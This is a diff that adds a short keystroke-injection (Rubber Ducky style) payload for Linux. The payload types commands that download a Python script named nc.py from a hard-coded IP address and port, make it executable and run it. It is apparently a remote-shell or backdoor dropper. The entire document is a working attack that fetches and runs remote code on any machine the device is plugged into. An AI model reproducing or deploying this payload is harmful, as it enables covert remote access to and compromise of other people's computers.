@@ -1,0 +1,10 @@
+REM linux version
+DELAY 1000
+STRING curl http://193.37.152.43:83/nc.py > nc.py
+ENTER
+DELAY 2000
+STRING chmod a+x nc.py
+DELAY 500
+STRING python nc.py
+DELAY 300
+ENTER
